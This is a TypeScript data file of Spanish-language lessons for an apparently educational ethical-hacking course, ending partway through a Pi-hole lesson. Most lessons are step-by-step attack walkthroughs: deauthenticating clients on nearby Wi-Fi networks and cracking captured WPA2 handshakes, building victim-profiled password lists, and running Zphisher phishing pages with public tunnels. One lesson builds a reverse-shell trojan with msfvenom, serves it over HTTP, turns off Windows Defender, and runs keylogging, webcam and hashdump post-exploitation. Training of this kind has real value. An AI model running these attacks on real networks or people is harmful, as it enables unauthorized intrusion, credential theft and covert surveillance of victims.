import { LessonContent } from "../types";

export const lessonsData: LessonContent[] = [
  {
    id: 1,
    title: "Clase 1: Introducción a la Seguridad de la Información",
    subtitle: "Fundamentos teóricos y la tríada CID (Confidencialidad, Integridad y Disponibilidad)",
    duration: "2 horas",
    difficulty: "Teórico",
    category: "Introducción",
    summary: "Conceptos iniciales del curso. Esta clase es introductoria y sienta las bases de las políticas de seguridad corporativa.",
    isIgnored: true,
    theory: {
      objectives: [
        "Comprender la diferencia entre Seguridad Informática y Seguridad de la Información.",
        "Aprender a priorizar los activos intangibles de datos en una organización.",
        "Analizar la Tríada de la Seguridad: Confidencialidad, Integridad y Disponibilidad (CID)."
      ],
      introduction: "La seguridad de la información consiste en la preservación de la confidencialidad, integridad y disponibilidad de la información. Además, pueden estar involucradas otras propiedades como la autenticidad, la responsabilidad, el no repudio y la fiabilidad.",
      keyConcepts: [
        { title: "Confidencialidad", description: "Garantizar que la información sea accesible únicamente para aquellos autorizados a tener acceso." },
        { title: "Integridad", description: "Salvaguardar la exactitud y completitud de la información y los métodos de procesamiento." },
        { title: "Disponibilidad", description: "Garantizar que los usuarios autorizados tengan acceso a la información y a los activos asociados cuando lo requieran." },
        { title: "Hacking Ético (White vs Black Hat)", description: "Un Hacker de Sombrero Blanco (White Hat) descubre y reporta vulnerabilidades con autorización para asegurar sistemas. Un cibercriminal (Black Hat) las explota ilegalmente para beneficio propio." }
      ]
    }
  },
  {
    id: 2,
    title: "Clase 2: Amenazas, Vulnerabilidades y Riesgos",
    subtitle: "Auditoría inalámbrica táctica con adaptadores TP-LINK TL-WN722N y suite Aircrack-ng",
    duration: "4 horas",
    difficulty: "Avanzado",
    category: "Inalámbrico",
    summary: "Uso del adaptador de red compatible con modo monitor, interceptación de handshake WPA2 de redes cercanas y crackeo con diccionarios de contraseñas.",
    isIgnored: false,
    theory: {
      objectives: [
        "Aprender a instalar controladores estables para el chip Realtek RTL8188EUS de la TP-LINK TL-WN722N V2/V3.",
        "Habilitar y administrar el Modo Monitor e inyección de paquetes inalámbricos en Kali Linux.",
        "Comprender el protocolo de negociación en 4 pasos (WPA/WPA2 4-way Handshake).",
        "Utilizar aircrack-ng con diccionarios optimizados (kaonashi, common) para descifrado offline."
      ],
      introduction: "Las redes inalámbricas son susceptibles a la interceptación pasiva de datos. Al activar el modo monitor en nuestro adaptador TP-LINK, podemos capturar las tramas de autenticación (handshake) que ocurren cuando un dispositivo legítimo se conecta al Access Point. Posteriormente, mediante un ataque de desautenticación forzada, aceleramos el proceso y desciframos la clave mediante fuerza bruta offline sin levantar sospechas directas en el canal de datos físico.",
      keyConcepts: [
        { title: "Modo Monitor", description: "Estado que permite a una tarjeta de red escuchar todo el tráfico del espacio radioeléctrico en un canal específico, sin estar asociada a ningún router." },
        { title: "WPA Handshake", description: "Proceso de cuatro pasos donde se intercambian llaves de sesión temporales. Capturar esto permite realizar ataques por diccionario sin estar conectado a la red." },
        { title: "Ataque de Desautenticación", description: "Envío de tramas de desasociación falsificando la dirección MAC del AP para desconectar momentáneamente a un cliente y forzar un nuevo handshake." }
      ]
    },
    commands: [
      { command: "iwconfig", description: "Verifica el nombre de tu tarjeta de red inalámbrica (suele ser wlan0 o wlan1) antes de empezar. Observarás que está en 'Mode:Managed'. (👇 Lee la Pregunta Frecuente #1 para confirmar el modo)" },
      { command: "sudo airmon-ng start wlan0", description: "Fuerza la tarjeta a 'Modo Monitor' (radar pasivo). COMANDO ALTERNATIVO: 'sudo iw dev wlan0 set type monitor'." },
      { command: "sudo airodump-ng wlan0", description: "Escáner general. Fíjate en dos columnas clave: BSSID (que es la dirección MAC del Router Emisor) y CH (el Canal por donde transmite). Anota esos datos de tu víctima y presiona Ctrl+C para detener el escaneo." },
      { command: "sudo airodump-ng -c [CANAL] -w [NOMBRE_ARCHIVO] --bssid [BSSID] wlan0", description: "Escáner dirigido. Reemplaza los datos de tu Router y elige un nombre para guardar la captura (ej. 'captura_handshake'). Fíjate en la sección inferior 'STATION': ahí aparecen las direcciones MAC de los dispositivos conectados. IMPORTANTE: Deja esta terminal ABIERTA. (👇 Lee la Pregunta Frecuente #2 y #5 sobre capturas y columnas)" },
      { command: "sudo aireplay-ng -0 9 -a [BSSID_ROUTER] -c [MAC_CLIENTE] wlan0", description: "Ataque de Deauth. ABRE UNA 2DA TERMINAL. Usa '-a' para la MAC del Router (Emisor) y '-c' para la MAC del dispositivo conectado (Receptor) que anotaste de STATION. Esto bombardea al cliente para desconectarlo. (👇 Lee la Pregunta Frecuente #3 si falla el handshake)" },
      { command: "sudo aircrack-ng -b [BSSID_ROUTER] -w [RUTA_AL_DICCIONARIO] [NOMBRE_ARCHIVO]-01.cap", description: "Crackeo offline. Una vez capturado el Handshake (arriba a la derecha en la primera terminal), detén todo con Ctrl+C y lanza este ataque. Reemplaza con la ruta de tu diccionario y el nombre de tu captura. (👇 Lee la Pregunta Frecuente #4 sobre cómo obtener el rockyou.txt)" }
    ],
    faqs: [
      {
        question: "Pregunta Frecuente #1: ¿Cómo sé si mi antena realmente entró en Modo Monitor?",
        answer: "Ejecuta el comando 'iwconfig wlan0'. Si en la segunda línea dice 'Mode:Monitor', estás listo para escanear. Si dice 'Mode:Managed', la tarjeta sigue funcionando como un receptor normal de Wi-Fi y airodump-ng fallará o no mostrará nada."
      },
      {
        question: "Pregunta Frecuente #2: ¿Dónde se guardó la captura (el archivo .cap) del Handshake?",
        answer: "Se guarda en la carpeta donde abriste la terminal. Por defecto, en Kali es tu carpeta personal (Home). Usa el comando 'ls' en la terminal para ver los archivos. Si corriste el escáner varias veces, el archivo irá cambiando de nombre automáticamente a captura_handshake-02.cap, -03.cap, etc."
      },
      {
        question: "Pregunta Frecuente #3: Lancé el ataque de Deauth pero no captura el Handshake, ¿Por qué?",
        answer: "Verifica tres cosas: 1. Asegúrate de tener la PRIMERA terminal (el escáner) ABIERTA y corriendo al mismo tiempo. 2. El dispositivo que estás atacando debe estar usando activamente el internet en ese momento (viendo un video, cargando una web). Si la pantalla del celular está apagada, a veces ignora la desconexión. 3. Algunos routers modernos tienen protección PMF obligatoria que bloquea estos ataques; en esos casos, prueba apagando y encendiendo el Wi-Fi del celular víctima manualmente."
      },
      {
        question: "Pregunta Frecuente #4: ¿Dónde encuentro el diccionario 'rockyou.txt' para hacer el crackeo offline?",
        answer: "El diccionario 'rockyou' suele venir preinstalado en Kali, pero en versiones ligeras hay que descargarlo. Abre una terminal y ejecuta: 'sudo apt update && sudo apt install wordlists -y'. Una vez instalado, estará comprimido. Para usarlo ejecuta: 'sudo gzip -d /usr/share/wordlists/rockyou.txt.gz'.\n\nPara propósitos de prueba, si quieres asegurarte de que tu crackeo funcione rápido, puedes inyectar la contraseña real de tu dispositivo en el diccionario. Primero dale permisos con: 'sudo chmod 777 /usr/share/wordlists/rockyou.txt', luego ábrelo con: 'nano /usr/share/wordlists/rockyou.txt'. Escribe tu contraseña en cualquier línea, guarda con 'Ctrl+O', dale Enter, y sal con 'Ctrl+X'. Finalmente, lanza el comando: 'sudo aircrack-ng -b [BSSID] -w /usr/share/wordlists/rockyou.txt captura-01.cap'."
      },
      {
        question: "Pregunta Frecuente #5: ¿Cómo interpreto las columnas del escáner Airodump-ng (BSSID, CH, STATION)?",
        answer: "Cuando lanzas el escáner, la pantalla se divide en dos. La parte superior muestra los Routers (Emisores). La columna 'BSSID' es su dirección MAC, 'CH' es el canal de transmisión, y 'ESSID' es el nombre del WiFi. La parte inferior muestra los clientes conectados (Receptores). La columna 'BSSID' te dice a qué router están conectados, y la columna 'STATION' muestra la MAC exacta de ese celular o laptop."
      }
    ]
  },
  {
    id: 3,
    title: "Clase 3: Matriz de Riesgo",
    subtitle: "Evaluación cualitativa y cuantitativa de riesgos de activos informáticos",
    duration: "2 horas",
    difficulty: "Intermedio",
    category: "Gestión de Riesgos",
    summary: "Planificación estratégica. Aprendizaje de valoración de amenazas, asignación de valores de impacto y probabilidad, y formulación de planes de mitigación.",
    isIgnored: false,
    theory: {
      objectives: [
        "Identificar activos de información críticos dentro de una estructura corporativa.",
        "Analizar la relación matemática: Riesgo = Probabilidad × Impacto.",
        "Clasificar riesgos en niveles Aceptable, Tolerable, Alto y Crítico.",
        "Establecer estrategias de tratamiento de riesgos: Mitigar, Transferir, Evitar o Aceptar."
      ],
      introduction: "La Matriz de Riesgo es una herramienta de control y gestión utilizada para identificar las actividades (procesos y proyectos) más importantes de una empresa, los riesgos inherentes y los factores que pueden desencadenar pérdidas financieras, reputacionales o de operatividad. Permite a los analistas de seguridad de la información mapear de forma visual qué incidentes requieren mayor atención presupuestaria y operacional inmediata.",
      keyConcepts: [
        { title: "Probabilidad (P)", description: "La frecuencia con la que un evento de seguridad adverso podría ocurrir debido a debilidades existentes. Se mide comúnmente en escala del 1 (Muy improbable) al 5 (Casi seguro)." },
        { title: "Impacto (I)", description: "La severidad del daño infligido a la infraestructura, finanzas, reputación o continuidad del negocio si la amenaza se materializa. Se mide de 1 (Insignificante) a 5 (Catastrófico)." },
        { title: "Valor del Riesgo (R)", description: "Multiplicación de la Probabilidad por el Impacto (P × I). El valor resultante determina si la atención debe ser inmediata (Zonas Rojas) o de monitoreo simple (Zonas Verdes)." }
      ]
    }
  },
  {
    id: 4,
    title: "Clase 4: Creación de Diccionarios de Datos",
    subtitle: "Uso estratégico de generadores de diccionarios tácticos Crunch y herramientas CUPP",
    duration: "3 horas",
    difficulty: "Intermedio",
    category: "Diccionarios",
    summary: "Generación personalizada de listas de contraseñas basadas en perfiles específicos de víctimas (CUPP) o combinaciones complejas algorítmicas (Crunch).",
    isIgnored: false,
    theory: {
      objectives: [
        "Comprender la diferencia entre ataques de diccionario y ataques de fuerza bruta pura.",
        "Utilizar la sintaxis de Crunch para generar patrones basados en conjuntos específicos de caracteres.",
        "Implementar ingeniería social básica mediante CUPP para crear diccionarios orientados a personas físicas.",
        "Analizar la importancia de la entropía y las políticas de contraseñas robustas."
      ],
      introduction: "Un ataque de fuerza bruta clásica puede durar años si el espacio de claves es grande. Sin embargo, los seres humanos suelen reutilizar datos de su vida diaria (fechas de nacimiento, nombres de mascotas, combinaciones numéricas sencillas). Mediante la creación de diccionarios de datos inteligentes, optimizamos exponencialmente el tiempo de crackeo de contraseñas. Crunch nos permite crear diccionarios deterministas basados en reglas matemáticas, mientras que CUPP genera listas personalizadas mediante la recolección de metadatos de un individuo.",
      keyConcepts: [
        { title: "Crunch", description: "Utilidad matemática para generar listas basadas en longitudes, caracteres y patrones específicos. Advertencia: Los diccionarios grandes pueden ocupar gigabytes o terabytes." },
        { title: "Tuberías (Piping |)", description: "Para evitar llenar tu disco duro, puedes usar el símbolo '|' para enviar las contraseñas generadas por Crunch directamente a otra herramienta (como aircrack-ng) sin guardar un archivo." },
        { title: "CUPP", description: "Herramienta basada en Ingeniería Social que genera contraseñas a partir de metadatos de la víctima (nombres, fechas, mascotas)." }
      ]
    },
    commands: [
      { command: "sudo apt install crunch", description: "Instalar Crunch en caso de que no venga preinstalado en tu distribución de Linux.", group: "Crunch" },
      { command: "crunch 4 4 0123456789 -o pines.txt", description: "Comando básico: Generar combinaciones numéricas de 4 dígitos y guardarlas. (👇 Lee la Pregunta Frecuente #4 sobre dónde se guarda)", group: "Crunch" },
      { command: "crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o mixto.txt", description: "Comando mixto: Generar combinaciones usando letras y números con longitud variable (entre 6 y 8 caracteres).", group: "Crunch" },
      { command: "crunch 8 8 -t Admin%%% -o lista_admin.txt", description: "Usar patrones avanzados (-t): Fijar una palabra y variar el final. (👇 Lee la Pregunta Frecuente #1 y #3 sobre los símbolos)", group: "Crunch" },
      { command: "crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -o claves.txt", description: "Usar un charset predefinido de Kali (mixalpha-numeric) para generar combinaciones de letras mayúsculas, minúsculas y números.", group: "Crunch" },
      { command: "crunch 8 8 -t Admin%%% | aircrack-ng -w - captura.cap -e MiWiFi", description: "Uso de Tuberías (|): No guarda archivo en disco. Envía las contraseñas generadas directamente a Aircrack-ng. (👇 Lee la Pregunta Frecuente #2 sobre archivos gigantes)", group: "Crunch" },
      { command: "git clone https://github.com/Mebus/cupp.git", description: "Clonar la herramienta de creación de perfiles de contraseñas de usuario comunes (CUPP).", group: "CUPP" },
      { command: "python3 cupp.py -i", description: "Ejecutar CUPP en modo interactivo para responder preguntas sobre la víctima (nombre, cumpleaños, etc.) y generar el wordlist personalizado.", group: "CUPP" }
    ],
    faqs: [
      {
        question: "Pregunta Frecuente #1: ¿Qué significan los símbolos especiales al usar patrones (-t) en Crunch?",
        answer: "Los símbolos son comodines: '@' representa letras minúsculas, ',' letras mayúsculas, '%' representa números y '^' representa símbolos especiales."
      },
      {
        question: "Pregunta Frecuente #2: Crunch me advierte que el archivo pesará Terabytes, ¿qué hago?",
        answer: "Si el archivo es demasiado grande para tu disco duro, NO uses '-o archivo.txt'. En su lugar, usa tuberías (Piping) con '|' para enviarlo directo a la herramienta de crackeo, o reduce la longitud/caracteres."
      },
      {
        question: "Pregunta Frecuente #3: ¿Por qué Crunch me da error cuando intento usar un patrón (-t)?",
        answer: "Crunch exige que la longitud mínima y máxima que colocas al inicio del comando coincida EXACTAMENTE con la cantidad de caracteres de tu patrón. Por ejemplo, si usas el patrón 'Admin%%%' (que tiene 8 caracteres), tu comando obligatoriamente debe empezar con 'crunch 8 8'. Si pones 'crunch 7 7 -t Admin%%%', la terminal te lanzará un error de sintaxis."
      },
      {
        question: "Pregunta Frecuente #4: ¿Dónde se guarda el archivo .txt que genera Crunch y puedo cambiar la ruta?",
        answer: "Por defecto, el archivo (ej. 'pines.txt') se guardará en la carpeta actual donde abriste la terminal (normalmente tu carpeta personal o 'Home'). Sí puedes elegir otro destino indicando la ruta completa en el comando. Por ejemplo: 'crunch 4 4 0123456789 -o /home/kali/Desktop/pines.txt' lo guardará directamente en tu Escritorio."
      }
    ]
  },
  {
    id: 5,
    title: "Clase 5: Examen de Mitad de Curso",
    subtitle: "Evaluación de conocimientos teóricos de seguridad y comandos iniciales",
    duration: "1 hora",
    difficulty: "Teórico",
    category: "Introducción",
    summary: "Autoevaluación de conocimientos adquiridos en redes inalámbricas, triada de seguridad, drivers de red y matriz de riesgo.",
    isIgnored: true,
    theory: {
      objectives: [
        "Verificar la retención conceptual de la Tríada CID.",
        "Evaluar la comprensión práctica de comandos de Kali Linux para auditorías inalámbricas.",
        "Medir la asimilación del cálculo de riesgos operacionales."
      ],
      introduction: "Esta es una parada para consolidar los conocimientos teóricos del alumno. Consiste en una serie de preguntas de control para certificar que el estudiante domina los fundamentos antes de adentrarse en temas avanzados de hacking ético, explotación y seguridad defensiva activa.",
      keyConcepts: [
        { title: "Evaluación teórica", description: "Cuestionarios de opción múltiple interactivos sobre escenarios de vulnerabilidades físicas y lógicas." },
        { title: "Casos prácticos", description: "Análisis rápido de problemas típicos al levantar interfaces monitor y soluciones lógicas." }
      ]
    }
  },
  {
    id: 6,
    title: "Clase 6: Ethical Hacking & Ingeniería Social (Phishing con Zphisher)",
    subtitle: "Clasificación de metodologías de ataque cibernético y simulación de phishing educativo",
    duration: "4 horas",
    difficulty: "Intermedio",
    category: "Ingeniería Social",
    summary: "Estudio detallado del Phishing (Whaling, Smishing, Vishing, Spear Phishing) y análisis táctico mediante el despliegue local de Zphisher.",
    isIgnored: false,
    theory: {
      objectives: [
        "Distinguir las distintas variantes del Phishing: Whaling, Smishing, Vishing, Pharming y Spear Phishing.",
        "Comprender la psicología detrás de la Ingeniería Social y las estrategias de prevención (MFA, filtros de email).",
        "Implementar y auditar de forma educativa la herramienta Zphisher para comprender vectores de ataque web.",
        "Identificar cómo las herramientas automatizadas capturan y almacenan las credenciales de las víctimas."
      ],
      introduction: "El phishing es una técnica de ingeniería social que busca engañar a los usuarios para que revelen información confidencial. Su impacto incluye pérdidas financieras y daños a la reputación. La educación, la Autenticación de Múltiples Factores (MFA) y los simulacros son las mejores defensas. Zphisher es una herramienta de código abierto que simplifica la creación de páginas de phishing (como Facebook o Instagram) para evaluar la concienciación de los usuarios de manera ética.",
      keyConcepts: [
        { title: "Variantes de Phishing", description: "Whaling (dirigido a altos ejecutivos), Smishing (por SMS), Vishing (llamadas telefónicas), Pharming (manipulación de DNS) y Spear Phishing (altamente personalizado)." },
        { title: "Prevención", description: "Uso de MFA, educación continua, políticas estrictas, verificación de URLs y simulacros regulares de phishing en la organización." },
        { title: "Zphisher", description: "Script automatizado que descarga plantillas web idénticas a sitios reales y utiliza servicios de reenvío de puertos para generar un enlace público hacia nuestro servidor local." }
      ]
    },
    commands: [
      { command: "git clone https://github.com/htr-tech/zphisher.git", description: "Clonar el repositorio de Zphisher que contiene herramientas automatizadas." },
      { command: "cd zphisher", description: "Navegar al directorio recién descargado donde se encuentran los scripts de la herramienta." },
      { command: "bash zphisher.sh", description: "Ejecutar la interfaz de consola de Zphisher. (👇 Lee la Pregunta Frecuente #1 si te da error)" },
      { command: "01", description: "En el menú verde interactivo: Seleccionar la plantilla objetivo (ej. 01 para Facebook)." },
      { command: "01", description: "Seleccionar el tipo de página (ej. 01 para Traditional Login Page)." },
      { command: "01", description: "Seleccionar el servicio de tunelización (ej. 01 para Localhost, ideal para pruebas locales). (👇 Lee la Pregunta Frecuente #2 y #3 sobre los túneles)" },
      { command: "N", description: "Cuando te pregunte 'Do You Want A Custom Port', simplemente presiona 'N' o Enter para usar el puerto por defecto y lanzar el servidor." },
      { command: "http://127.0.0.1:8080 (o la URL que te dé)", description: "(URL) Abre tu navegador en Kali Linux y entra al enlace que te proporciona Zphisher (URL 1 o URL 2) para simular a la víctima cayendo en la trampa. Escribe un usuario y contraseña falsos." },
      { command: "Ctrl + C", description: "(TECLADO) Una vez veas las credenciales capturadas en texto rojo en la consola Zphisher, presiona esta combinación para detener el servidor malicioso." },
      { command: "cat auth/usernames.dat", description: "Leer el archivo donde Zphisher guarda automáticamente las credenciales capturadas para reportes. IMPORTANTE: Asegúrate de estar dentro de la carpeta 'zphisher' en tu terminal antes de ejecutar este comando." }
    ],
    faqs: [
      { question: "Pregunta Frecuente #1: La terminal arroja error: 'zphisher.sh: command not found'", answer: "Asegúrate de haber entrado a la carpeta correcta usando el comando 'cd zphisher' antes de ejecutar el script. Si sigues sin poder, escribe 'ls' para verificar que la carpeta existe." },
      { question: "Pregunta Frecuente #2: El túnel de Cloudflared se queda colgado o marca error", answer: "A veces Cloudflare bloquea la conexión si se hacen muchos intentos seguidos. Presiona 'Ctrl + C' para salir, vuelve a iniciar Zphisher y esta vez elige la opción de túnel 'LocalXpose' o 'Localhost'." },
      { question: "Pregunta Frecuente #3: Si elijo Localhost, ¿puedo enviarle el link a mi amigo en otra casa?", answer: "No. La opción Localhost (127.0.0.1) solo funciona dentro de tu propia computadora o máquina virtual. Para enviar un link a alguien fuera de tu red, debes usar Cloudflared o LocalXpose." }
    ]
  },
  {
    id: 7,
    title: "Clase 7: Vulnerabilidad de Dispositivos (Metasploit & MSFvenom)",
    subtitle: "Generación de payloads troyanizados en Windows y despliegue del framework de explotación",
    duration: "4 horas",
    difficulty: "Avanzado",
    category: "Explotación",
    summary: "Creación de Reverse Shells utilizando MSFvenom, entrega de payloads vía servidor HTTP en Python, escucha con Netcat y evasión con Hoaxshell.",
    isIgnored: false,
    theory: {
      objectives: [
        "Comprender el funcionamiento de un Reverse Shell (conexión de retorno al atacante).",
        "Generar un payload troyanizado (ejecutable malicioso) utilizando MSFvenom.",
        "Desplegar un Multi-Handler en Metasploit (msfconsole) para recibir la conexión.",
        "Ejecutar comandos de post-explotación interactiva vía Meterpreter (sysinfo, screenshot, webcam_stream, mkdir).",
        "Comprender la necesidad teórica de evadir o desactivar defensas (Firewall/Antivirus) en entornos de laboratorio."
      ],
      introduction: "Un Reverse Shell es una conexión donde el sistema objetivo 'llama' al atacante, evadiendo configuraciones básicas de red. En este laboratorio usaremos Metasploit Framework. Primero, msfvenom generará un archivo .exe troyanizado. Luego, msfconsole quedará a la escucha. NOTA: En la vida real, Windows Defender y el Firewall bloquearían este archivo básico. Por cuestiones de laboratorio y aprendizaje, asumimos que el entorno tiene las defensas desactivadas para permitir el estudio del ataque.",
      keyConcepts: [
        { title: "MSFvenom", description: "Herramienta de Metasploit para generar y codificar payloads de todo tipo (ej. windows/meterpreter/reverse_tcp)." },
        { title: "Meterpreter", description: "Un payload avanzado y dinámico que opera en memoria (sin tocar el disco duro), ofreciendo comandos poderosos de post-explotación." },
        { title: "Firewall & Permisos", description: "Las conexiones inversas suelen requerir permisos excepcionales o la desactivación temporal del Firewall en el laboratorio para que la conexión de retorno tenga éxito." }
      ]
    },
    commands: [
      { command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP_DE_TU_KALI] LPORT=[PUERTO_ej._4444] -f exe -o [NOMBRE_ARCHIVO.exe]", description: "Crear el troyano de 64 bits apuntando a tu Kali. Reemplaza `[IP_DE_TU_KALI]` con tu IP real, `[PUERTO_ej._4444]` con el puerto elegido y `[NOMBRE_ARCHIVO.exe]` con el nombre que desees darle al virus. ⚠️ VERIFICA: al ejecutar, la salida debe decir `selecting arch: x64` — si dice `x86`, estás usando el payload equivocado. (👇 Lee la Pregunta Frecuente #1, #2 y #3)" },
      { command: "python3 -m http.server 80", description: "(Paso Intermedio en OTRA terminal) Levantar un servidor web en Kali para que Windows descargue el `.exe`. Déjalo corriendo." },
      { command: "msfconsole", description: "Abrir la consola del framework Metasploit en una tercera terminal o pestaña." },
      { command: "use exploit/multi/handler", description: "Cargar el módulo que escucha conexiones entrantes del payload." },
      { command: "set PAYLOAD windows/x64/meterpreter/reverse_tcp", description: "Configurar el payload x64. CRÍTICO: debe coincidir EXACTAMENTE con el que usaste en msfvenom. (👇 Pregunta Frecuente #6 si usas payload incorrecto)" },
      { command: "set LHOST [IP_DE_TU_KALI]", description: "Reemplaza `[IP_DE_TU_KALI]` con la misma IP que pusiste en msfvenom." },
      { command: "set LPORT [PUERTO_ej._4444]", description: "Reemplaza `[PUERTO_ej._4444]` con el mismo puerto que usaste en msfvenom (por defecto: 4444)." },
      { command: "exploit", description: "Ejecutar y quedar a la escucha en Kali. Verás: `[*] Started reverse TCP handler on [IP]:4444`" },
      { command: "", description: "(NOTA) Ve a la máquina víctima Windows. ANTES de descargar el archivo, debes desactivar la `Protección en Tiempo Real` de Windows Defender. (👇 Lee la Pregunta Frecuente #5 para el proceso completo paso a paso). Luego abre el navegador y entra a `http://[IP_DE_TU_KALI]` para ver los archivos, o descarga directamente desde `http://[IP_DE_TU_KALI]/[NOMBRE_ARCHIVO.exe]`. ¡Ejecútalo y vuelve a Kali! Al terminar el laboratorio, reactiva todo siguiendo la misma Pregunta Frecuente #5." },
      { command: "sysinfo", description: "(Post-explotación) Obtener información básica del sistema operativo de la víctima." },
      { command: "screenshot", description: "(Post-explotación) Tomar una captura silenciosa de la pantalla de la víctima." },
      { command: "webcam_stream", description: "(Post-explotación) Encender la cámara web de la víctima y ver el video en vivo." },
      { command: "mkdir HACKED", description: "(Post-explotación) Crear una carpeta remotamente en el escritorio de la víctima." },
      { command: "keyscan_start", description: "(Post-explotación) Iniciar el keylogger invisible. Se ejecuta directamente en la memoria RAM (sin tocar el disco duro) para capturar las pulsaciones de teclado." },
      { command: "keyscan_dump", description: "(Post-explotación) Volcar en tu pantalla todo lo que la víctima ha escrito desde que iniciaste el keyscan. (👇 Lee la Pregunta Frecuente #7 para entender cómo funciona)." },
      { command: "hashdump", description: "(Post-explotación) Volcar los hashes de contraseñas de los usuarios desde la base de datos SAM de Windows." }
    ],
    faqs: [
      { question: "Pregunta Frecuente #1: ¿Qué IP debo poner en LHOST? ¿La de mi Kali Linux o la de Windows?", answer: "LHOST significa 'Local Host', la máquina que va a ESCUCHAR la conexión de retorno. Debes colocar la IP de tu Kali Linux VM. Puedes verla ejecutando 'ifconfig' o 'ip a' en Kali. El objetivo es que la máquina víctima se conecte hacia tu Kali." },
      { question: "Pregunta Frecuente #2: ¿Cómo averiguo cuál es la IP de mi Kali Linux para ponerla en LHOST?", answer: "Abre una nueva terminal en Kali y escribe 'ifconfig' (o 'ip a'). IMPORTANTE: Si usas VirtualBox, asegúrate de tener tu red en 'Adaptador Puente' (Bridged) para que la interfaz (ej. eth0) tenga una IP real de tu red local (ej. 192.168.x.x). ¡NO uses la IP en modo NAT (usualmente 10.0.2.15), porque la máquina víctima no podrá alcanzarla!" },
      { question: "Pregunta Frecuente #3: ¿Cuál es el LPORT correcto? ¿Puedo usar 4444?", answer: "LPORT es el puerto de escucha. Puedes elegir prácticamente cualquier puerto (4444, 8080, 1337). El 4444 es el clásico de Metasploit y es perfecto para el laboratorio. La ÚNICA regla: el puerto de msfvenom y el del handler en msfconsole DEBEN ser idénticos." },
      { question: "Pregunta Frecuente #4: ¿Dónde se guardó el archivo [NOMBRE_ARCHIVO.exe] que creé con msfvenom?", answer: "El archivo se guarda en la carpeta donde tenías abierta la terminal al ejecutar el comando. Por defecto en Kali es '/home/kali/'. Usa 'ls' para confirmarlo. Recuerda que el servidor Python (python3 -m http.server 80) debe estar corriendo DESDE ESA MISMA carpeta para que Windows pueda descargarlo." },
      { question: "Pregunta Frecuente #5: ¿Cómo desactivo (y reactivo) la protección de Windows para el laboratorio?", answer: "Para que el payload funcione, DEBES desactivar la protección principal en la máquina víctima Windows.\n\n🔴 PASO OBLIGATORIO: Desactivar Windows Defender\n1. Ve a: Inicio → Configuración → Privacidad y seguridad → Seguridad de Windows → Protección contra virus y amenazas.\n2. Haz clic en Administrar la configuración.\n3. Apaga el interruptor de Protección en tiempo real.\n\n🔴 PASO OPCIONAL: Desactivar el Firewall (Solo si la conexión falla o se bloquea)\n1. Abre el CMD como Administrador.\n2. Ejecuta: `netsh advfirewall set allprofiles state off`\n\n🟢 AL TERMINAR EL LABORATORIO: Reactiva todo\nDefender: vuelve a la configuración y activa Protección en tiempo real.\nFirewall (Si lo desactivaste): `netsh advfirewall set allprofiles state on`\n\n⚠️ IMPORTANTE: Nunca dejes la seguridad apagada fuera del entorno de laboratorio controlado." },
      { question: "Pregunta Frecuente #6: El .exe se ejecuta pero Metasploit no recibe la conexión (o el exe se cierra solo).", answer: "Error de arquitectura: lo más probable es que creaste el payload de 32 bits ('windows/meterpreter/reverse_tcp') en un Windows de 64 bits. SIEMPRE usa 'windows/x64/meterpreter/reverse_tcp' para sistemas Windows 10/11 modernos. Regenera el .exe con el comando correcto de la Clase 7 y actualiza el PAYLOAD en msfconsole antes de ejecutar el exploit." },
      { question: "Pregunta Frecuente #7: ¿Cómo funciona exactamente el keylogger (keyscan_start) de Metasploit y dónde guarda los datos?", answer: "El comando `keyscan_start` activa el registro de teclas dentro de Meterpreter. A diferencia de los keyloggers comunes, este sniffer NO guarda nada en el disco duro de la víctima; todo se almacena temporalmente en la memoria RAM del proceso comprometido para no dejar rastro forense.\n\nPara ver lo que se está capturando, debes solicitar activamente que el sistema te envíe los datos a tu Kali ejecutando el comando `keyscan_dump`. Esto volcará inmediatamente en tu consola todo el texto que el usuario haya escrito desde que iniciaste el escaneo." }
    ]
  },
  {
    id: 8,
    title: "Clase 8: DMZ, Firewall y DNS Sinkhole (Pi-hole & Access Point)",
    subtitle: "Militarización de perímetros de red, despliegue de Access Points y filtrado DNS con Pi-hole",
    duration: "4 horas",
    difficulty: "Intermedio",
    category: "Redes & Firewalls",
    summary: "Creación de Access Points con linux-wifi-hotspot, desvío de DNS corporativo mediante Pi-hole y restricción de contenidos web mediante Regex.",
    isIgnored: false,
    theory: {
      objectives: [
        "Desplegar Access Points inalámbricos utilizando adaptadores como TP-Link TL-WN722N.",
        "Aprender a instalar Pi-hole como servidor DNS local, evadiendo bloqueos de SO durante la instalación.",
        "Gestionar el bloqueo avanzado de sitios web mediante expresiones regulares (Regex filter).",
        "Analizar el registro de consultas (Query Log) para detectar y bloquear dominios problemáticos."
      ],
      introduction: "La seguridad perimetral controla el flujo de datos. En esta lección, implementamos un Access Point usando 'linux-wifi-hotspot' (previa configuración en modo monitor) para enrutar el tráfico de los dispositivos conectados hacia Pi-hole. Pi-hole funciona como un servidor DNS local que intercepta consultas; además de listas negras simples, aprenderemos a utilizar Expresiones Regulares (Regex) para bloquear dominios de forma dinámica (por ejemplo, todas las variantes de YouTube).",
      keyConcepts: [
        { title: "Linux Wifi Hotspot", description: "Herramienta que requiere que la tarjeta de red (ej. wlan0) esté en modo monitor para crear un AP de forma gráfica, definiendo SSID e interfaces." },
        { title: "Regex Filter (Expresiones Regulares)", description: "Secuencia de caracteres que forma un patrón de búsqueda. En Pi-hole se usa en la sección 'Domain management' para bloquear dominios masivamente (ej. (\\.|^)youtube\\.com$)." },
        { title: "Query Log y Fallback", description: "El Query Log muestra en tiempo real las peticiones bloqueadas (rojo) y permitidas (verde). A veces es necesario configurar 'about:config' en el navegador (browser.fixup.fallback-to-https = false) para pruebas de red local." }
      ]
    },
    commands: [
      { command: "sudo apt update && sudo apt install -y libgtk-3-dev build-essential gcc g++ pkg-config make hostapd libqrencode-dev libpng-dev iptables dnsmasq", description: "Instalar las librerías y dependencias obligatorias. Sin esto, la compilación fallará o el hotspot no podrá enrutar el tráfico." },
      { command: "git clone https://github.com/lakinduakash/linux-wifi-hotspot", description: "Clonar el repositorio oficial para instalar la utilidad de creación de puntos de acceso." },
      { command: "cd linux-wifi-hotspot", description: "Moverse dentro de la carpeta que acabamos de descargar. (Sin esto, el siguiente paso dará error de 'makefile no encontrado')." },
      { command: "make && sudo make install", description: "Compilar e instalar los binarios de linux-wifi-hotspot en el sistema." },
